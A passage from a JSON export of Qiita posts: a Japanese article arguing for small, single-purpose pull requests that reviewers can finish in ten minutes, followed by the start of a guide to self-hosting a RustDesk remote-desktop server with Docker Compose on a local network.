data-sourcepos=\"91:1-91:171\">また、自分でも迷っている、あるいは微妙だと思っていることは背景も含めて、素直に変更行にコメントしてしまいましょう。</p>\n<p data-sourcepos=\"93:1-93:117\">「このメソッド、命名もっと良いのないかな。」「ここちょっと複雑な気がしてる。」</p>\n<p data-sourcepos=\"95:1-95:204\">このコメントがあるだけで、レビュアー側もどこを特に重点的に見れば良いか分かりやすくなるので、きっと濃いコメントを残してくれると思います。</p>\n<h3 data-sourcepos=\"98:1-98:37\">\n<span id=\"4-動作確認の記録を残す\" class=\"fragment\"></span><a href=\"#4-%E5%8B%95%E4%BD%9C%E7%A2%BA%E8%AA%8D%E3%81%AE%E8%A8%98%E9%8C%B2%E3%82%92%E6%AE%8B%E3%81%99\"><i class=\"fa fa-link\"></i></a>4. 動作確認の記録を残す</h3>\n<p data-sourcepos=\"100:1-101:90\">どのように動作確認を行い、何を確認したのかを明記しましょう。<br>\nスクリーンショットやGIFアニメーションを添えるとより親切です。</p>\n<p data-sourcepos=\"103:1-103:141\">レビュアーが手元で確認しようとしていることを先に確認しておいて、その記録を残しておきましょう。</p>\n<h3 data-sourcepos=\"105:1-105:37\">\n<span id=\"5-同様の変更は段階的に\" class=\"fragment\"></span><a href=\"#5-%E5%90%8C%E6%A7%98%E3%81%AE%E5%A4%89%E6%9B%B4%E3%81%AF%E6%AE%B5%E9%9A%8E%E7%9A%84%E3%81%AB\"><i class=\"fa fa-link\"></i></a>5. 同様の変更は段階的に</h3>\n<p data-sourcepos=\"107:1-107:137\">多くの箇所に同じような変更を適用したい場合、いきなり全部を変更したPRを出すのは避けましょう。</p>\n<p data-sourcepos=\"109:1-109:28\"><strong>推奨アプローチ：</strong></p>\n<ol data-sourcepos=\"110:1-112:0\">\n<li data-sourcepos=\"110:1-110:68\">まず最小単位のPRを作成してレビューしてもらう</li>\n<li data-sourcepos=\"111:1-112:0\">それがOKなら、同じパターンを他の箇所に適用したPRを作る（この段階では大きくなってもOK）</li>\n</ol>\n<p data-sourcepos=\"113:1-113:169\">最初の小さなPRでアプローチが承認されていれば、大きなPRも機械的な確認で済むため、レビュー時間を大幅に短縮できます。</p>\n<h3 data-sourcepos=\"115:1-115:46\">\n<span id=\"6-事前の擦り合わせを活用する\" class=\"fragment\"></span><a href=\"#6-%E4%BA%8B%E5%89%8D%E3%81%AE%E6%93%A6%E3%82%8A%E5%90%88%E3%82%8F%E3%81%9B%E3%82%92%E6%B4%BB%E7%94%A8%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>6. 事前の擦り合わせを活用する</h3>\n<p data-sourcepos=\"116:1-116:159\">上記の工夫以外にも、<strong>顔を合わせて事前にPRの説明を行なってしまう</strong>、というのもひとつの有効手段だと思います。</p>\n<p data-sourcepos=\"118:1-118:257\">デイリーハドルやモブプログラミングの時間を使って、ドラフトPRをチームメンバーに説明しておきましょう。事前に方向性を共有しておくことで、正式なレビュー時の負担が軽減されます。</p>\n<h2 data-sourcepos=\"120:1-120:12\">\n<span id=\"まとめ\" class=\"fragment\"></span><a href=\"#%E3%81%BE%E3%81%A8%E3%82%81\"><i class=\"fa fa-link\"></i></a>まとめ</h2>\n<p data-sourcepos=\"122:1-122:210\">「レビューが遅い」という課題は、実はレビュアー側だけの問題ではありません。<strong>PRを作る側の工夫次第で、チーム全体の開発速度は劇的に改善します。</strong></p>\n<p data-sourcepos=\"124:1-124:262\">小さく、明確で、文脈が整理されたPRは、レビュアーにとって「すぐに見たくなる」PRです。後回しにされず、素早くフィードバックが得られることで、あなた自身の開発サイクルも加速します。</p>\n<p data-sourcepos=\"126:1-126:307\">レビュアーへの配慮は、回り回って自分自身への配慮になります。なぜなら、あなたも誰かのPRをレビューする側になるからです。チーム全体で「レビューしやすいPR文化」を育てることで、全員が恩恵を受けることができます。</p>\n<p data-sourcepos=\"128:1-128:134\">明日からではなく、<strong>今日から</strong>。次のPRで「10分でレビューできるサイズ」を意識してみませんか？</p>\n<p data-sourcepos=\"130:1-130:87\">その一歩が、チームの開発体験を変える第一歩になるはずです！</p>\n",
      "body": "## レビューをされる側、する側どちらもストレスを感じる。\n\nPRのレビュー待ち。開発者なら誰もが経験する、あのモヤモヤ、ドキドキした時間です。\n\n**「いつレビューしてもらえるんだろう」**\n**「どこを指摘されるんだろう」**\n**「修正にどれくらい時間がかかるんだろう」**\n\nレビューを待つ側のストレスは想像に難くありません。\n\nそれと同時にレビューする側も同じくらい作業のストレスを抱えています。\n\n**- PRのコンテキストを理解する**\n**- コード全体をチェックする**\n**- 場合によっては実際に動作確認をする**\n\nAIがコードを書いてくれるようになっても、人間がコードをレビューするという工程はしばらくなくならないため、この負担が消えることはありません。\n\nではPRを作る側、レビュー側の両方の負担が小さくなり、お互いが幸せになるにはどうしたら良いのでしょうか？\n\n## 解決策はシンプル：PRを小さくする\n\n結論から言えば、**PRをなるべく小さくして、レビュアーの負担を減らす**ことが最も効果的です。\n\nレビュアーはPRレビューが自分に依頼されたことは認識しています。\nではなぜすぐにレビューをしてくれないのか。**それは後回しにされているからです。**\n\nレビュー依頼の通知が来る→PRをさっと見る→「複雑そう。ちょっとめんどくさい。」→**よし後で時間とってやろう！**\n\nエンジニアなら誰もがこのような行為を行ったことがあると思います。　自分もよくやります。(だめ)\nしかし、**すべてのPRで上記のように先延ばしするわけではない**と思います。\n\n例えば変数名が変わってるだけであったり、テストコードがちょっと追加されたとかだったり、内容が簡単であったり、小さかったりするとすぐに承認することができますよね。\n\n**要はそのPRが複雑で、時間がかかると思われているからすぐに見てもらえないわけです。**(レビューのリソースが...プロジェクトのスケジュールが... とかは置いておいて)\n\n## レビューが遅いことがもたらす弊害は実は多い\n\n上記のようにPRレビューが後回しになってしまう状態は、チーム、ひいては組織に思っている以上の不利益をもたらします。\n\n### 1. リリースの遅延とビジネス機会の損失\n\nまず、シンプルに**リリースが遅れます。**本来その変更が本番環境に反映され、ユーザーに価値を届けるはずだった時間が失われます。新機能であれば収益化の機会を逃し、バグ修正であればユーザー体験の改善が遅れます。レビュー待ちの1日が、**ビジネスにとって大きな機会損失**になっているかもしれません。\n\n### 2. コンテキストスイッチングのコスト\n\nレビューが遅れると、PRを出した開発者は別のタスクに取り掛かります。そして数日後にレビューコメントが返ってくると、「あれ、これ何だっけ？」と再度コンテキストを思い出す必要があります。この**コンテキストスイッチング**は想像以上に認知的負荷が高く、生産性を大きく低下させます。\n\n### 3. マージコンフリクトのリスク増大\n\nレビューが遅れている間に、他のPRがマージされていきます。時間が経てば経つほど、**コンフリクトが発生する可能性が高まります。**コンフリクトの解消には時間がかかり、場合によっては再度レビューが必要になることもあります。\n\n### 4. チームの心理的安全性の低下\n\nレビュー待ちが常態化すると、「どうせすぐにレビューされないし」という諦めの空気が生まれます。これは**チームの心理的安全性を損ない、コミュニケーションの質を低下**させます。逆に、スムーズなレビューサイクルはチームの信頼関係を強化します。\n\n### 5. 技術的負債の蓄積\nこれは大きなPRの弊害になりますが、**大きなPRは、レビュワーが細部まで確認できないまま承認される**ことがあります。「とりあえず動いているからいいか」という妥協が積み重なり、気づけば技術的負債が山積みに。小さなPRであれば、品質を担保しながら素早くマージできます。\n\nこれらの問題を解決する鍵は、やはり**「小さなPR」**にあります。次のセクションでは、具体的にどうすればPRを小さく保てるのか、実践的な方法を見ていきましょう。\n\n## 具体的な実践方法\n\n### 1. 10分ルールを意識する\n\nレビューが10分以内で終わるサイズを目指しましょう。これは経験則ですが、10分を超えると集中力が途切れ、レビューの質も低下します。\n\n単にレビュアーがコードを読む時間だけでなく、それらの内容をネットで調べたり、公式ドキュメントを参照したり、動作確認をしたりなどレビューに関わるそれらの時間を**すべて含めて10分以内**です。\n\n### 2. 一つのPRには一つのコンテキスト\n\n**修正や追加する内容のコンテキストは、あくまで一つ**に絞ります。コンテキストや目的が異なる場合は、迷わずPRを分けましょう。\n\n例えば：\n- ❌ 「ログイン機能の改善 + UIの調整 + バグ修正」\n- ✅ 「ログイン機能のバリデーション強化」「ログイン画面のレイアウト調整」「〇〇画面の表示バグ修正」\n\nコンテキストが複数あると、今読んできる変更がどのコンテキストに対して必要なコードなのかが分かりづらく、レビュアーの負担になってしまいます。\n\n### 3. セルフレビューを徹底し、PRを補完していく\n\nPRを出す前に、何も知らない人になりきってレビューしてみましょう。\n\n**- コードだけでは読み取れないコンテキストがありませんか？**\n**- 引っかかった部分はありませんか？**\n\n引っかかったところで参考文献を貼ったり、悩んだポイントをPRのコメントに残すことで、レビュアーの理解を助けます。\n\nレビュアーになりきった状態で、そのレビュアーがどんなことを調べるだろうか？どこでレビューが止まるかを先読みするのです。\n\nまた、自分でも迷っている、あるいは微妙だと思っていることは背景も含めて、素直に変更行にコメントしてしまいましょう。\n\n「このメソッド、命名もっと良いのないかな。」「ここちょっと複雑な気がしてる。」\n\nこのコメントがあるだけで、レビュアー側もどこを特に重点的に見れば良いか分かりやすくなるので、きっと濃いコメントを残してくれると思います。\n\n\n### 4. 動作確認の記録を残す\n\nどのように動作確認を行い、何を確認したのかを明記しましょう。\nスクリーンショットやGIFアニメーションを添えるとより親切です。\n\nレビュアーが手元で確認しようとしていることを先に確認しておいて、その記録を残しておきましょう。\n\n### 5. 同様の変更は段階的に\n\n多くの箇所に同じような変更を適用したい場合、いきなり全部を変更したPRを出すのは避けましょう。\n\n**推奨アプローチ：**\n1. まず最小単位のPRを作成してレビューしてもらう\n2. それがOKなら、同じパターンを他の箇所に適用したPRを作る（この段階では大きくなってもOK）\n\n最初の小さなPRでアプローチが承認されていれば、大きなPRも機械的な確認で済むため、レビュー時間を大幅に短縮できます。\n\n### 6. 事前の擦り合わせを活用する\n上記の工夫以外にも、**顔を合わせて事前にPRの説明を行なってしまう**、というのもひとつの有効手段だと思います。\n\nデイリーハドルやモブプログラミングの時間を使って、ドラフトPRをチームメンバーに説明しておきましょう。事前に方向性を共有しておくことで、正式なレビュー時の負担が軽減されます。\n\n## まとめ\n\n「レビューが遅い」という課題は、実はレビュアー側だけの問題ではありません。**PRを作る側の工夫次第で、チーム全体の開発速度は劇的に改善します。**\n\n小さく、明確で、文脈が整理されたPRは、レビュアーにとって「すぐに見たくなる」PRです。後回しにされず、素早くフィードバックが得られることで、あなた自身の開発サイクルも加速します。\n\nレビュアーへの配慮は、回り回って自分自身への配慮になります。なぜなら、あなたも誰かのPRをレビューする側になるからです。チーム全体で「レビューしやすいPR文化」を育てることで、全員が恩恵を受けることができます。\n\n明日からではなく、**今日から**。次のPRで「10分でレビューできるサイズ」を意識してみませんか？\n\nその一歩が、チームの開発体験を変える第一歩になるはずです！\n",
      "coediting": false,
      "comments_count": 0,
      "created_at": "2025-12-09T14:21:53+09:00",
      "group": null,
      "id": "af36a10ad841b8d18570",
      "likes_count": 0,
      "private": false,
      "reactions_count": 0,
      "stocks_count": 0,
      "tags": [
        {
          "name": "GitHub",
          "versions": []
        },
        {
          "name": "レビュー",
          "versions": []
        },
        {
          "name": "開発プロセス",
          "versions": []
        },
        {
          "name": "コードレビュー",
          "versions": []
        }
      ],
      "title": "10分以内にレビューが終わる小さなPRの作り方 - 小さなPRがもたらす大きな変化-",
      "updated_at": "2025-12-09T14:34:08+09:00",
      "url": "https://qiita.com/pezio/items/af36a10ad841b8d18570",
      "user": {
        "description": "",
        "facebook_id": "",
        "followees_count": 0,
        "followers_count": 1,
        "github_login_name": "pezio-1021",
        "id": "pezio",
        "items_count": 16,
        "linkedin_id": "",
        "location": "",
        "name": "tail-teil-tey",
        "organization": "",
        "permanent_id": 485238,
        "profile_image_url": "https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/485238/profile-images/1648052962",
        "team_only": false,
        "twitter_screen_name": null,
        "website_url": ""
      },
      "page_views_count": null,
      "team_membership": null,
      "organization_url_name": null,
      "slide": false,
      "_source": "trending_by_likes"
    },
    {
      "rendered_body": "<h2 data-sourcepos=\"2:1-2:15\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h2>\n<p data-sourcepos=\"4:1-4:145\">RustDeskのhbbs/hbbrをDocker Composeで常駐させ、同一LAN内からクライアントで接続するための手順をまとめました。</p>\n<p data-sourcepos=\"6:1-6:190\">RustDeskはTeamViewerやAnyDeskのようなリモートデスクトップツールですが、自前でサーバを立てることで外部サービスに依存せずに利用できます。</p>\n<div data-sourcepos=\"8:1-10:3\" class=\"note info\">\n<span class=\"fa fa-fw fa-check-circle\"></span><div>\n<p data-sourcepos=\"9:1-9:142\">筆者はWindowsにサーバを立てて、Mac、WindowsにRustDeskを導入し、どこからでも接続できるようにしています。</p>\n</div>\n</div>\n<h2 data-sourcepos=\"12:1-12:24\">\n<span id=\"アーキテクチャ\" class=\"fragment\"></span><a href=\"#%E3%82%A2%E3%83%BC%E3%82%AD%E3%83%86%E3%82%AF%E3%83%81%E3%83%A3\"><i class=\"fa fa-link\"></i></a>アーキテクチャ</h2>\n<h3 data-sourcepos=\"14:1-14:22\">\n<span id=\"役割とポート\" class=\"fragment\"></span><a href=\"#%E5%BD%B9%E5%89%B2%E3%81%A8%E3%83%9D%E3%83%BC%E3%83%88\"><i class=\"fa fa-link\"></i></a>役割とポート</h3>\n<table data-sourcepos=\"16:1-19:51\">\n<thead>\n<tr data-sourcepos=\"16:1-16:34\">\n<th data-sourcepos=\"16:2-16:12\">サーバ</th>\n<th data-sourcepos=\"16:14-16:21\">役割</th>\n<th data-sourcepos=\"16:23-16:33\">ポート</th>\n</tr>\n</thead>\n<tbody>\n<tr data-sourcepos=\"18:1-18:150\">\n<td data-sourcepos=\"18:2-18:11\"><strong>hbbs</strong></td>\n<td data-sourcepos=\"18:13-18:36\">ID / rendezvous server</td>\n<td data-sourcepos=\"18:38-18:149\">TCP 21115（ID登録）, TCP/UDP 21116（シグナリング/NATテスト）, TCP 21114/21118（付随機能）</td>\n</tr>\n<tr data-sourcepos=\"19:1-19:51\">\n<td data-sourcepos=\"19:2-19:11\"><strong>hbbr</strong></td>\n<td data-sourcepos=\"19:13-19:26\">relay server</td>\n<td data-sourcepos=\"19:28-19:50\">TCP 21117（中継）</td>\n</tr>\n</tbody>\n</table>\n<h3 data-sourcepos=\"21:1-21:13\">\n<span id=\"構成図\" class=\"fragment\"></span><a href=\"#%E6%A7%8B%E6%88%90%E5%9B%B3\"><i class=\"fa fa-link\"></i></a>構成図</h3>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"23:1-37:3\"><div class=\"highlight\"><pre><code>┌─────────────────────────────────────────────────┐\n│              LAN (192.168.x.0/24)               │\n│                                                 │\n│  ┌─────────────┐      ┌─────────────────────┐  │\n│  │   Windows   │      │   Mac (Server)      │  │\n│  │   Client    │◄────►│   Docker Desktop    │  │\n│  └─────────────┘      │   ├─ hbbs           │  │\n│                       │   └─ hbbr           │  │\n│  ┌─────────────┐      └─────────────────────┘  │\n│  │  Mac/Linux  │               ▲               │\n│  │   Client    │───────────────┘               │\n│  └─────────────┘                               │\n└─────────────────────────────────────────────────┘\n</code></pre></div></div>\n<h3 data-sourcepos=\"39:1-39:13\">\n<span id=\"鍵管理\" class=\"fragment\"></span><a href=\"#%E9%8D%B5%E7%AE%A1%E7%90%86\"><i class=\"fa fa-link\"></i></a>鍵管理</h3>\n<p data-sourcepos=\"41:1-41:160\">hbbs初回起動時に <code>id_ed25519.pub</code>（公開鍵）が生成されます。クライアントのNetwork設定にこの鍵を貼り付けて認証します。</p>\n<h2 data-sourcepos=\"43:1-43:15\">\n<span id=\"前提条件\" class=\"fragment\"></span><a href=\"#%E5%89%8D%E6%8F%90%E6%9D%A1%E4%BB%B6\"><i class=\"fa fa-link\"></i></a>前提条件</h2>\n<ul data-sourcepos=\"45:1-52:0\">\n<li data-sourcepos=\"45:1-45:52\">サーバ用PCにDockerがインストール済み</li>\n<li data-sourcepos=\"46:1-46:41\">サーバのLAN IPを把握している</li>\n<li data-sourcepos=\"47:1-50:13\">ファイアウォールで以下ポートの通過を許可\n<ul data-sourcepos=\"48:3-50:13\">\n<li data-sourcepos=\"48:3-48:13\">21115/TCP</li>\n<li data-sourcepos=\"49:3-49:19\">21116/TCP &amp; UDP</li>\n<li data-sourcepos=\"50:3-50:13\">21117/TCP</li>\n</ul>\n</li>\n<li data-sourcepos=\"51:1-52:0\">クライアントにRustDeskがインストール済み</li>\n</ul>\n<h2 data-sourcepos=\"53:1-53:24\">\n<span id=\"docker-compose-設定\" class=\"fragment\"></span><a href=\"#docker-compose-%E8%A8%AD%E5%AE%9A\"><i class=\"fa fa-link\"></i></a>Docker Compose 設定</h2>\n<h3 data-sourcepos=\"55:1-55:22\">\n<span id=\"ファイル作成\" class=\"fragment\"></span><a href=\"#%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E4%BD%9C%E6%88%90\"><i class=\"fa fa-link\"></i></a>ファイル作成</h3>\n<div class=\"code-frame\" data-lang=\"bash\" data-sourcepos=\"57:1-60:3\"><div class=\"highlight\"><pre><code><span class=\"nb\">mkdir</span> <span class=\"nt\">-p</span> ~/rustdesk-server\n<span class=\"nb\">cd</span> ~/rustdesk-server\n</code></pre></div></div>\n<p data-sourcepos=\"62:1-62:59\"><code>docker-compose.yml</code>を以下の内容で作成します。</p>\n<div data-sourcepos=\"64:1-66:3\" class=\"note warn\">\n<span class=\"fa fa-fw fa-exclamation-circle\"></span><div>\n<p data-sourcepos=\"65:1-65:73\">Compose v2では<code>version</code>フィールドは省略推奨（警告回避）</p>\n</div>\n</div>\n<div class=\"code-frame\" data-lang=\"yaml\" data-sourcepos=\"68:1-95:3\"><div class=\"highlight\"><pre><code><span class=\"na\">services</span><span class=\"pi\">:</span>\n  <span class=\"na\">hbbs</span><span class=\"pi\">:</span>\n    <span class=\"na\">image</span><span class=\"pi\">:</span> <span class=\"s\">rustdesk/rustdesk-server</span>\n    <span class=\"na\">container_name</span><span class=\"pi\">:</span> <span class=\"s\">rustdesk-hbbs</span>\n    <span class=\"na\">restart</span><span class=\"pi\">:</span> <span class=\"s\">unless-stopped</span>\n    <span class=\"na\">volumes</span><span class=\"pi\">:</span>\n      <span class=\"pi\">-</span> <span class=\"s\">rustdesk-data:/root</span>\n    <span class=\"na\">ports</span><span class=\"pi\">:</span>\n      <span class=\"pi\">-</span> <span class=\"s2\">\"</span><span class=\"s\">21114:21114\"</span>\n      <span class=\"pi\">-</span> <span class=\"s2\">\"</span><span class=\"s\">21115:21115\"</span>\n      <span class=\"pi\">-</span> <span class=\"s2\">\"</span><span class=\"s\">21116:21116\"</span>\n      <span class=\"pi\">-</span> <span class=\"s2\">\"</span><span class=\"s\">21116:21116/udp\"</span>\n    <span class=\"na\">command</span><span class=\"pi\">:</span> <span class=\"s\">hbbs</span>\n\n  <span class=\"na\">hbbr</span><span class=\"pi\">:</span>\n    <span class=\"na\">image</span><span class=\"pi\">:</span> <span class=\"s\">rustdesk/rustdesk-server</span>\n    <span class=\"na\">container_name</span><span class=\"pi\">:</span> <span class=\"s\">rustdesk-hbbr</span>\n    <span class=\"na\">restart</span><span class=\"pi\">:</span> <span class=\"s\">unless-stopped</span>\n    <span class=\"na\">volumes</span><span class=\"pi\">:</span>\n      <span class=\"pi\">-</span> <span class=\"s\">rustdesk-data:/root</span>\n    <span class=\"na\">ports</span><span class=\"pi\">:</span>\n      <span class=\"pi\">-</span> <span class=\"s2\">\"</span><span class=\"s\">21117:21117\"</span>\n    <span class=\"na\">command</span><span class=\"pi\">:</span> <span class=\"s\">hbbr</span>\n\n<span class=\"na\">volumes</span><span class=\"pi\">:</span>\n  <span class=\"na\">rustdesk-data</span><span class=\"pi\">:</span>\n</code></pre></div></div>\n<h2 data-sourcepos=\"97:1-97:36\">\n<span id=\"サーバセットアップ手順\" class=\"fragment\"></span><a href=\"#%E3%82%B5%E3%83%BC%E3%83%90%E3%82%BB%E3%83%83%E3%83%88%E3%82%A2%E3%83%83%E3%83%97%E6%89%8B%E9%A0%86\"><i class=\"fa fa-link\"></i></a>サーバセットアップ手順</h2>\n<h3 data-sourcepos=\"99:1-99:28\">\n<span id=\"1-起動と状態確認\" class=\"fragment\"></span><a href=\"#1-%E8%B5%B7%E5%8B%95%E3%81%A8%E7%8A%B6%E6%85%8B%E7%A2%BA%E8%AA%8D\"><i class=\"fa fa-link\"></i></a>1. 起動と状態確認</h3>\n<div class=\"code-frame\" data-lang=\"bash\" data-sourcepos=\"101:1-104:3\"><div class=\"highlight\"><pre><code>docker compose up <span class=\"nt\">-d</span>\ndocker compose ps\n</code></pre></div></div>\n<p data-sourcepos=\"106:1-106:13\">ログ確認:</p>\n<div class=\"code-frame\" data-lang=\"bash\" data-sourcepos=\"108:1-111:3\"><div class=\"highlight\"><pre><code>docker logs rustdesk-hbbs <span class=\"nt\">--tail</span> 50\ndocker logs rustdesk-hbbr <span class=\"nt\">--tail</span> 50\n</code></pre></div></div>\n<h3 data-sourcepos=\"113:1-113:34\">\n<span id=\"2-公開鍵keyの取得\" class=\"fragment\"></span><a href=\"#2-%E5%85%AC%E9%96%8B%E9%8D%B5key%E3%81%AE%E5%8F%96%E5%BE%97\"><i class=\"fa fa-link\"></i></a>2. 公開鍵（Key）の取得</h3>\n<div class=\"code-frame\" data-lang=\"bash\" data-sourcepos=\"115:1-118:3\"><div class=\"highlight\"><pre><code>docker <span class=\"nb\">cp </span>rustdesk-hbbs:/root/id_ed25519.pub ./id_ed25519.pub\n<span class=\"nb\">cat</span> ./id_ed25519.pub\n</code></pre></div></div>\n<div data-sourcepos=\"120:1-122:3\" class=\"note alert\">\n<span class=\"fa fa-fw fa-times-circle\"></span><div>\n<p data-sourcepos=\"121:1-121:125\">表示された1行をクライアント設定のKeyに貼り付けます。<strong>改行・空白を混入させないこと。</strong></p>\n</div>\n</div>\n<h3 data-sourcepos=\"124:1-124:31\">\n<span id=\"3-サーバのlan-ip確認\" class=\"fragment\"></span><a href=\"#3-%E3%82%B5%E3%83%BC%E3%83%90%E3%81%AElan-ip%E7%A2%BA%E8%AA%8D\"><i class=\"fa fa-link\"></i></a>3. サーバのLAN IP確認</h3>\n<div class=\"code-frame\" data-lang=\"bash\" data-sourcepos=\"126:1-128:3\"><div class=\"highlight\"><pre><code>ipconfig getifaddr en0\n</code></pre></div></div>\n<p data-sourcepos=\"130:1-130:104\">Wi-Fi/有線でインターフェイスが異なる場合は<code>en1</code>などに読み替えてください。</p>\n<h2 data-sourcepos=\"132:1-132:39\">\n<span id=\"クライアントインストール\" class=\"fragment\"></span><a href=\"#%E3%82%AF%E3%83%A9%E3%82%A4%E3%82%A2%E3%83%B3%E3%83%88%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB\"><i class=\"fa fa-link\"></i></a>クライアントインストール</h2>\n<h3 data-sourcepos=\"134:1-134:7\">\n<span id=\"mac\" class=\"fragment\"></span><a href=\"#mac\"><i class=\"fa fa-link\"></i></a>Mac</h3>\n<div class=\"code-frame\" data-lang=\"bash\" data-sourcepos=\"136:1-138:3\"><div class=\"highlight\"><pre><code>brew <span class=\"nb\">install</span> <span class=\"nt\">--cask</span> rustdesk\n</code></pre></div></div>\n<h3 data-sourcepos=\"140:1-140:11\">\n<span id=\"windows\" class=\"fragment\"></span><a href=\"#windows\"><i class=\"fa fa-link\"></i></a>Windows</h3>\n<div class=\"code-frame\" data-lang=\"powershell\" data-sourcepos=\"142:1-144:3\"><div class=\"highlight\"><pre><code><span class=\"n\">winget</span><span class=\"w\"> </span><span class=\"nx\">install</span><span class=\"w\"> </span><span class=\"nx\">rustdesk.rustdesk</span><span class=\"w\">\n</span></code></pre></div></div>\n<p data-sourcepos=\"146:1-146:97\">または<a href=\"https://rustdesk.com/\" rel=\"nofollow noopener\" target=\"_blank\">公式サイト</a>からインストーラをダウンロード。</p>\n<h2 data-sourcepos=\"148:1-148:27\">\n<span id=\"クライアント設定\" class=\"fragment\"></span><a href=\"#%E3%82%AF%E3%83%A9%E3%82%A4%E3%82%A2%E3%83%B3%E3%83%88%E8%A8%AD%E5%AE%9A\"><i class=\"fa fa-link\"></i></a>クライアント設定</h2>\n<p data-sourcepos=\"150:1-150:88\">RustDeskを起動し、<strong>Settings &gt; Network &gt; Unlock</strong> から以下を設定します。</p>\n<table data-sourcepos=\"152:1-156:67\">\n<thead>\n<tr data-sourcepos=\"152:1-152:22\">\n<th data-sourcepos=\"152:2-152:9\">項目</th>\n<th data-sourcepos=\"152:11-152:21\">設定値</th>\n</tr>\n</thead>\n<tbody>\n<tr data-sourcepos=\"154:1-154:88\">\n<td data-sourcepos=\"154:2-154:16\"><strong>ID Server</strong></td>\n<td data-sourcepos=\"154:18-154:87\">サーバのLAN IP（例: <code>192.168.1.100</code>）※ポート指定不要</td>\n</tr>\n<tr data-sourcepos=\"155:1-155:29\">\n<td data-sourcepos=\"155:2-155:19\"><strong>Relay Server</strong></td>\n<td data-sourcepos=\"155:21-155:28\">同上</td>\n</tr>\n<tr data-sourcepos=\"156:1-156:67\">\n<td data-sourcepos=\"156:2-156:10\"><strong>Key</strong></td>\n<td data-sourcepos=\"156:12-156:66\">\n<code>id_ed25519.pub</code>の内容（公開鍵全文、1行）</td>\n</tr>\n</tbody>\n</table>\n<h3 data-sourcepos=\"158:1-158:40\">\n<span id=\"無人アクセス設定推奨\" class=\"fragment\"></span><a href=\"#%E7%84%A1%E4%BA%BA%E3%82%A2%E3%82%AF%E3%82%BB%E3%82%B9%E8%A8%AD%E5%AE%9A%E6%8E%A8%E5%A5%A8\"><i class=\"fa fa-link\"></i></a>無人アクセス設定（推奨）</h3>\n<p data-sourcepos=\"160:1-160:177\">接続される側で <strong>Settings &gt; Security &gt; Unattended Access</strong> を有効化し、強固なパスワードを設定しておくと、承諾操作なしで接続できます。</p>\n<h2 data-sourcepos=\"162:1-162:15\">\n<span id=\"接続確認\" class=\"fragment\"></span><a href=\"#%E6%8E%A5%E7%B6%9A%E7%A2%BA%E8%AA%8D\"><i class=\"fa fa-link\"></i></a>接続確認</h2>\n<h3 data-sourcepos=\"164:1-164:33\">\n<span id=\"windows-からの疎通確認\" class=\"fragment\"></span><a href=\"#windows-%E3%81%8B%E3%82%89%E3%81%AE%E7%96%8E%E9%80%9A%E7%A2%BA%E8%AA%8D\"><i class=\"fa fa-link\"></i></a>Windows からの疎通確認</h3>\n<div class=\"code-frame\" data-lang=\"powershell\" data-sourcepos=\"166:1-169:3\"><div class=\"highlight\"><pre><code><span class=\"n\">Test-NetConnection</span><span class=\"w\"> </span><span class=\"err\">&lt;サーバ</span><span class=\"nx\">IP</span><span class=\"err\">&gt;</span><span class=\"w\"> </span><span class=\"nt\">-Port</span><span class=\"w\"> </span><span class=\"nx\">21116</span><span class=\"w\">   </span><span class=\"c\"># hbbs</span><span class=\"w\">\n</span><span class=\"n\">Test-NetConnection</span><span class=\"w\"> </span><span class=\"err\">&lt;サーバ</span><span class=\"nx\">IP</span><span class=\"err\">&gt;</span><span class=\"w\"> </span><span class=\"nt\">-Port</span><span class=\"w\"> </span><span class=\"nx\">21117</span><span class=\"w\">   </span><span class=\"c\"># hbbr</span><span class=\"w\">\n</span></code></pre></div></div>\n<h3 data-sourcepos=\"171:1-171:19\">\n<span id=\"接続フロー\" class=\"fragment\"></span><a href=\"#%E6%8E%A5%E7%B6%9A%E3%83%95%E3%83%AD%E3%83%BC\"><i class=\"fa fa-link\"></i></a>接続フロー</h3>\n<ol data-sourcepos=\"173:1-176:0\">\n<li data-sourcepos=\"173:1-173:55\">接続される側のRustDeskを起動しIDを表示</li>\n<li data-sourcepos=\"174:1-174:64\">接続する側のRustDeskで相手のIDを入力して接続</li>\n<li data-sourcepos=\"175:1-176:0\">初回は接続される側で「承諾」、または無人アクセスのパスワードで入室</li>\n</ol>\n<h2 data-sourcepos=\"177:1-177:24\">\n<span id=\"接続シーケンス\" class=\"fragment\"></span><a href=\"#%E6%8E%A5%E7%B6%9A%E3%82%B7%E3%83%BC%E3%82%B1%E3%83%B3%E3%82%B9\"><i class=\"fa fa-link\"></i></a>接続シーケンス</h2>\n<iframe id=\"qiita-embed-content__426f96d8fb1c6c36738df46219491df6\" src=\"https://qiita.com/embed-contents/mermaid#qiita-embed-content__426f96d8fb1c6c36738df46219491df6\" style=\"width:100%;\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" data-content='{\"data\":\"sequenceDiagram\\n participant Client as クライアント\\n participant hbbs as hbbs (ID)\\n participant hbbr as hbbr (Relay)\\n participant Host as 接続先ホスト\\n\\n Client-&gt;&gt;hbbs: 登録/シグナリング (TCP/UDP 21116)\\n Host-&gt;&gt;hbbs: 登録/シグナリング (TCP/UDP 21116)\\n hbbs--&gt;&gt;Client: ピア情報/経路指示\\n hbbs--&gt;&gt;Host: ピア情報/経路指示\\n alt P2P 可能\\n Client--&gt;&gt;Host: 直接接続（NAT 穴あけ）\\n else P2P 不可\\n Client-&gt;&gt;hbbr: 接続要求 (TCP 21117)\\n Host-&gt;&gt;hbbr: 接続確立 (TCP 21117)\\n hbbr--&gt;&gt;Client: リレー転送\\n hbbr--&gt;&gt;Host: リレー転送\\n end\",\"key\":\"709cbbe8c1cd4e83fc88537d9865d8c3\"}'>\n</iframe>\n\n<h2 data-sourcepos=\"200:1-200:36\">\n<span id=\"トラブルシューティング\" class=\"fragment\"></span><a href=\"#%E3%83%88%E3%83%A9%E3%83%96%E3%83%AB%E3%82%B7%E3%83%A5%E3%83%BC%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0\"><i class=\"fa fa-link\"></i></a>トラブルシューティング</h2>\n<h3 data-sourcepos=\"202:1-202:44\">\n<span id=\"1-port-is-already-allocated-エラー\" class=\"fragment\"></span><a 